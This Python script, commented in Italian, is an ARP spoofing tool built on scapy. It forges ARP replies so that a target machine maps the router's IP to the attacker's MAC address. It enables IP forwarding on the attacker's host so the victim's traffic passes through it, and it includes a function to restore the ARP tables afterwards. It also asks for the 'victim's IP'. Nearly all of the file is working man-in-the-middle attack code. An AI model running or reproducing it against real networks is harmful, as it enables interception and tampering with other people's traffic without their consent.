#!usr/bin/env python

import subprocess
import scapy.all as scapy
import optparse


def get_mac(ip):
    # stiamo creando un pacchetto ARP
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # combiniamo i due pacchetti
    arp_request_broadcast = broadcast/arp_request
    # sending the packet -> non stiamo usando sr ma srp in quanto sta una custom ether part
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

# abbiamo bisogno di creare un arp response -> op = 2 (il valore di default sarebbe 1 che sta per request)
# pdst sarebbe l'indirizzio ip di destinazione del pacchetto
# hwdst sarbbe il mac address del target
# psrc per settare la source del pacchetto, in queto caso l'ip del router
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    # quando si invia il pacchetto al target, quest'ultimo pensa che e' inviato dall'ip del router ma al contempo
    # vedra' che viene dal mac address della nostra macchina
    # cambiera' l'associazione nel arp table (arp -a)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # senza hwrc scapy impostera' il mac address in questo pacchetto come il mio mac
    scapy.send(packet, count=4, verbose=False)
    # inviamo il pacchetto 4 volte x esser sicuri che la macchina target lo riceva


def enable_ip_forwarding():
    # Allow packets to flow through my computer without dropping them
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target's or victim's IP address")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="gateway's or router's IP address")
    (options, arguments) = parser.parse_args()
    if not options.target_ip and not options.gateway_ip:
        parser.error("[-] Please enter a valid target ip address and a valid gateway, use --help for more info")
    elif not options.target_ip:
        parser.error("[-] Please enter a valid target ip address, use --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Please enter a valid gateway ip address, use --help for more info")
    return options
